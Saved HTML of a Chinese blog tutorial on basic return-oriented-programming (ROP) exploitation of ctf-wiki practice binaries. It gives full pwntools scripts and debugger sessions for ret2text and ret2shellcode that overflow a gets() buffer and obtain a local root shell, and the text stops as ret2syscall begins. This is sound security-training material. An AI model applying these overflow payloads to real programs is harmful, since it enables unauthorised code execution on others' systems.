<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="PWN - 基本ROP

 https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/
 

这里用到的所有题目：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/

`HackTheBox ..." data-next-head=""/><meta property="og:title" content="PWN - 基本ROP" data-next-head=""/><meta property="og:description" content="PWN - 基本ROP

 https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/
 

这里用到的所有题目：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/

`HackTheBox ..." data-next-head=""/><meta property="og:url" content="https://sunsetaction.top/2025/06/14/PWN - 基本ROP" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:published_time" content="2025-06-14" data-next-head=""/><meta property="article:modified_time" content="2025-06-15" data-next-head=""/><meta property="article:section" content="二进制安全" data-next-head=""/><meta property="article:tag" content="PWN" data-next-head=""/><meta property="article:tag" content="ROP" data-next-head=""/><meta property="article:tag" content="ret2text" data-next-head=""/><meta property="article:tag" content="ret2shellcode" data-next-head=""/><meta property="article:tag" content="ret2syscall" data-next-head=""/><meta property="article:tag" content="ret2libc" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="PWN - 基本ROP" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top/2025/06/14/PWN - 基本ROP" data-next-head=""/><title data-next-head="">PWN - 基本ROP</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1313794ff57095ab.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1313794ff57095ab.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/951-ad0cb56524ddaaf1.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-19a80ecec622553d.js" defer=""></script><script src="/_next/static/mjZBuiwGkP0bnzupdQUa7/_buildManifest.js" defer=""></script><script src="/_next/static/mjZBuiwGkP0bnzupdQUa7/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]"><h1 class="text-xl md:text-2xl font-bold text-red-700 dark:text-red-400">PWN - 基本ROP</h1><div class="flex flex-col"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">SUNSET</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">2025-06-14</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">(Updated:<!-- -->2025-06-15<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">二进制安全</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">PWN</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">ROP</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">ret2text</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">ret2shellcode</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">ret2syscall</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">ret2libc</span></div></div><div class="my-8 text-center">加载中...</div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"PWN - 基本ROP","contentHtml":"\u003ch1\u003ePWN - 基本ROP\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/\"\u003ehttps://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e这里用到的所有题目：\u003ca href=\"https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/\"\u003ehttps://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eHackTheBox - Ellingson\u003c/code\u003e 碰到缓冲区溢出，无从下手，故有此篇\u003c/p\u003e\n\u003ch2\u003eret2text\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eret2text\u003c/code\u003e 即控制程序执行程序本身已有的的代码 (即， \u003ccode\u003e.text\u003c/code\u003e 段中的代码) \u003c/p\u003e\n\u003cp\u003e收查看程序保护机制\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ret2text checksec ret2text          \n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/Test/StackBufferOverFlow/ret2text/ret2text'\u003c/span\u003e\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e仅仅开启\u003ccode\u003eNX\u003c/code\u003e ，并且是 \u003ccode\u003e32\u003c/code\u003e 位程序\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003egets\u003c/code\u003e函数，很明显存在缓冲区溢出漏洞，并且没有做边界保护\u003c/p\u003e\n\u003cp\u003e并且\u003ccode\u003esecure\u003c/code\u003e函数中有 \u003ccode\u003e/bin/sh\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003evoid \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003esecure\u003c/span\u003e\u003c/span\u003e()\n{\n  unsigned int v0; // eax\n  int input; // [esp+18h] [ebp-10h] BYREF\n  int secretcode; // [esp+1Ch] [ebp-Ch]\n\n  v0 = \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e(0);\n  srand(v0);\n  secretcode = rand();\n  __isoc99_scanf(\u0026#x26;unk_8048760, \u0026#x26;input);\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( input == secretcode )\n    system(\u003cspan class=\"hljs-string\"\u003e\"/bin/sh\"\u003c/span\u003e);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e定位\u003ccode\u003esystem\u003c/code\u003e函数\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epwndbg\u003e disas secure\nDump of assembler code \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e secure:\n   0x080485fd \u0026#x3C;+0\u003e:     push   ebp\n   0x080485fe \u0026#x3C;+1\u003e:     mov    ebp,esp\n   0x08048600 \u0026#x3C;+3\u003e:     sub    esp,0x28\n   0x08048603 \u0026#x3C;+6\u003e:     mov    DWORD PTR [esp],0x0\n   0x0804860a \u0026#x3C;+13\u003e:    call   0x8048470 \u0026#x3C;\u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e@plt\u003e\n   0x0804860f \u0026#x3C;+18\u003e:    mov    DWORD PTR [esp],eax\n   0x08048612 \u0026#x3C;+21\u003e:    call   0x80484b0 \u0026#x3C;srand@plt\u003e\n   0x08048617 \u0026#x3C;+26\u003e:    call   0x80484e0 \u0026#x3C;rand@plt\u003e\n   0x0804861c \u0026#x3C;+31\u003e:    mov    DWORD PTR [ebp-0xc],eax\n   0x0804861f \u0026#x3C;+34\u003e:    lea    eax,[ebp-0x10]\n   0x08048622 \u0026#x3C;+37\u003e:    mov    DWORD PTR [esp+0x4],eax\n   0x08048626 \u0026#x3C;+41\u003e:    mov    DWORD PTR [esp],0x8048760\n   0x0804862d \u0026#x3C;+48\u003e:    call   0x80484f0 \u0026#x3C;__isoc99_scanf@plt\u003e\n   0x08048632 \u0026#x3C;+53\u003e:    mov    eax,DWORD PTR [ebp-0x10]\n   0x08048635 \u0026#x3C;+56\u003e:    cmp    eax,DWORD PTR [ebp-0xc]\n   0x08048638 \u0026#x3C;+59\u003e:    jne    0x8048646 \u0026#x3C;secure+73\u003e\n   0x0804863a \u0026#x3C;+61\u003e:    mov    DWORD PTR [esp],0x8048763\n   0x08048641 \u0026#x3C;+68\u003e:    call   0x8048490 \u0026#x3C;system@plt\u003e\n   0x08048646 \u0026#x3C;+73\u003e:    leave\n   0x08048647 \u0026#x3C;+74\u003e:    ret\nEnd of assembler dump.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在\u003ccode\u003e0x0804863a\u003c/code\u003e处\u003c/p\u003e\n\u003cp\u003e接下来计算偏移量，使用 \u003ccode\u003epwndbg\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e反编译\u003ccode\u003emain\u003c/code\u003e找到\u003ccode\u003egets\u003c/code\u003e \u003ccode\u003e0x080486ae\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epwndbg\u003e disas main\nDump of assembler code \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e main:\n   0x08048648 \u0026#x3C;+0\u003e:     push   ebp\n   0x08048649 \u0026#x3C;+1\u003e:     mov    ebp,esp\n   0x0804864b \u0026#x3C;+3\u003e:     and    esp,0xfffffff0\n   0x0804864e \u0026#x3C;+6\u003e:     add    esp,0xffffff80\n   0x08048651 \u0026#x3C;+9\u003e:     mov    eax,ds:0x804a060\n   0x08048656 \u0026#x3C;+14\u003e:    mov    DWORD PTR [esp+0xc],0x0\n   0x0804865e \u0026#x3C;+22\u003e:    mov    DWORD PTR [esp+0x8],0x2\n   0x08048666 \u0026#x3C;+30\u003e:    mov    DWORD PTR [esp+0x4],0x0\n   0x0804866e \u0026#x3C;+38\u003e:    mov    DWORD PTR [esp],eax\n   0x08048671 \u0026#x3C;+41\u003e:    call   0x80484d0 \u0026#x3C;setvbuf@plt\u003e\n   0x08048676 \u0026#x3C;+46\u003e:    mov    eax,ds:0x804a040\n   0x0804867b \u0026#x3C;+51\u003e:    mov    DWORD PTR [esp+0xc],0x0\n   0x08048683 \u0026#x3C;+59\u003e:    mov    DWORD PTR [esp+0x8],0x1\n   0x0804868b \u0026#x3C;+67\u003e:    mov    DWORD PTR [esp+0x4],0x0\n   0x08048693 \u0026#x3C;+75\u003e:    mov    DWORD PTR [esp],eax\n   0x08048696 \u0026#x3C;+78\u003e:    call   0x80484d0 \u0026#x3C;setvbuf@plt\u003e\n   0x0804869b \u0026#x3C;+83\u003e:    mov    DWORD PTR [esp],0x804876c\n   0x080486a2 \u0026#x3C;+90\u003e:    call   0x8048480 \u0026#x3C;puts@plt\u003e\n   0x080486a7 \u0026#x3C;+95\u003e:    lea    eax,[esp+0x1c]\n   0x080486ab \u0026#x3C;+99\u003e:    mov    DWORD PTR [esp],eax\n   0x080486ae \u0026#x3C;+102\u003e:   call   0x8048460 \u0026#x3C;gets@plt\u003e\n   0x080486b3 \u0026#x3C;+107\u003e:   mov    DWORD PTR [esp],0x80487a4\n   0x080486ba \u0026#x3C;+114\u003e:   call   0x8048450 \u0026#x3C;\u003cspan class=\"hljs-built_in\"\u003eprintf\u003c/span\u003e@plt\u003e\n   0x080486bf \u0026#x3C;+119\u003e:   mov    eax,0x0\n   0x080486c4 \u0026#x3C;+124\u003e:   leave\n   0x080486c5 \u0026#x3C;+125\u003e:   ret\nEnd of assembler dump.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在\u003ccode\u003egets\u003c/code\u003e处设置断点\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epwndbg\u003e b *0x080486ae\nBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003erun\u003c/code\u003e然后观察栈帧\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epwndbg\u003e run                 \nStarting program: /root/Desktop/Test/StackBufferOverFlow/ret2text/ret2text \nwarning: Unable to find libthread_db matching inferior\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003es thread library, thread debugging will not be available.\nThere is something amazing here, \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e you know anything?\n                                                         \nBreakpoint 1, 0x080486ae \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e main () at ret2text.c:24\nwarning: 24     ret2text.c: No such file or directory\nWarning: Avoided exploring possible address 0xfffdade8.                                                                                                                                                                             \nYou can explicitly explore it with `vmmap-explore 0xfffda000`\nLEGEND: STACK | HEAP | CODE | DATA | WX | RODATA\n───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────────\n EAX  0xffffcfac ◂— 0   \n EBX  0xf7f9ae14 ◂— 0x232d0c /* \u003cspan class=\"hljs-string\"\u003e'\\x0c-#'\u003c/span\u003e */                                                                                                                                                                                         \n ECX  0xf7f9c8e0 ◂— 0\n EDX  0\n EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0\n ESI  0x80486d0 (__libc_csu_init) ◂— push ebp\n EBP  0xffffd018 ◂— 0\n ESP  0xffffcf90 —▸ 0xffffcfac ◂— 0\n EIP  0x80486ae (main+102) —▸ 0xfffdade8 ◂— 0xfffdade8\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以看到\u003ccode\u003eEBP\u003c/code\u003e =\u003ccode\u003e0xffffd018\u003c/code\u003e ，\u003ccode\u003eESP\u003c/code\u003e =\u003ccode\u003e0xffffcfa\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epwndbg\u003e p/d 0xffffd018 - 0xffffcfac\n\u003cspan class=\"hljs-variable\"\u003e$1\u003c/span\u003e = 108\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e编写\u003ccode\u003eexp\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  ret2text \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e exp.py\nfrom pwn import *\n\nsh = process(\u003cspan class=\"hljs-string\"\u003e'./ret2text'\u003c/span\u003e)\ntarget = 0x0804863a\npayload = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 112 + p32(target)\nsh.sendline(payload)\nsh.interactive()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  ret2text python exp.py\n[+] Starting \u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e process \u003cspan class=\"hljs-string\"\u003e'./ret2text'\u003c/span\u003e: pid 3343\n[*] Switching to interactive mode\nThere is something amazing here, \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e you know anything?\nMaybe I will tell you next \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e !$ \u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e\nroot\n$  \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e\u003cstrong\u003eret2shellcode\u003c/strong\u003e\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eret2shellcode\u003c/code\u003e，即控制程序执行 \u003ccode\u003eshellcode\u003c/code\u003e 代码。通常情况下，shellcode 需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码。\n查看保护机制，未开启任何保护\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ret2shellcode checksec ret2shellcode \n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/Test/StackBufferOverFlow/ret2shellcode/ret2shellcode'\u003c/span\u003e\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX unknown - GNU_STACK missing\n    PIE:        No PIE (0x8048000)\n    Stack:      Executable\n    RWX:        Has RWX segments\n    Stripped:   No\n    Debuginfo:  Yes\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e依旧是\u003ccode\u003egets\u003c/code\u003e ，存在缓冲区溢出漏洞\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是这次并没有其他函数，也没有 \u003ccode\u003e/bin/sh\u003c/code\u003e 的身影\u003c/p\u003e\n\u003cp\u003e这里使用\u003ccode\u003estrncpy\u003c/code\u003e将\u003ccode\u003es\u003c/code\u003e传递到\u003ccode\u003ebuf2\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们调试一下程序，查看\u003ccode\u003ebss\u003c/code\u003e区域是否拥有读写权限\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e 0x804a000  0x804b000 rw-p     1000   1000 ret2shellcode\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e那么思路就是：\u003ccode\u003eshellcode +（偏移值 - len(shellcode)）* A  + buf2add\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e计算偏移量\u003c/p\u003e\n\u003cp\u003e首先生成\u003ccode\u003e200\u003c/code\u003e长度但是每一段都是唯一的字符\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epwndbg\u003e cyclic 200\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e返回地址被\u003ccode\u003edaab\u003c/code\u003e 覆盖上去了，再计算偏移量\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epwndbg\u003e cyclic -l daab\nFinding cyclic pattern of 4 bytes: b\u003cspan class=\"hljs-string\"\u003e'daab'\u003c/span\u003e (hex: 0x64616162)\nFound at offset 112\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e偏移量和\u003ccode\u003ebuf2\u003c/code\u003e地址我们都知道了，直接编写\u003ccode\u003epayload\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\nshellcode = asm(shellcraft.sh())\nshellcode_pad = shellcode + (112 - (len(shellcode))) * b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e\nbuf2_add = 0x804a080\nsh = process(\u003cspan class=\"hljs-string\"\u003e'./ret2shellcode'\u003c/span\u003e)\nsh.sendline(shellcode_pad + p32(buf2_add))\nsh.interactive()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@sunset-virtual-machine:~# python3 exp.py \n[+] Starting \u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e process \u003cspan class=\"hljs-string\"\u003e'./ret2shellcode'\u003c/span\u003e: pid 58718\n[*] Switching to interactive mode\nNo system \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e you this \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e !!!\n\u003cspan class=\"hljs-built_in\"\u003ebye\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebye\u003c/span\u003e ~$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=0(root) gid=0(root) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=0(root)\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e\u003cstrong\u003eret2syscall\u003c/strong\u003e\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eret2syscall\u003c/code\u003e，即控制程序执行系统调用，获取 \u003ccode\u003eshell\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e查看程序，\u003ccode\u003e32\u003c/code\u003e位，静态程序，没有使用动态链接库\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ret2syscall file ret2syscall \nret2syscall: ELF 32-bit LSB executable, Intel i386, version 1 (GNU/Linux), statically linked, \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看保护机制，栈不可执行，无法使用\u003ccode\u003eret2shellcode\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs 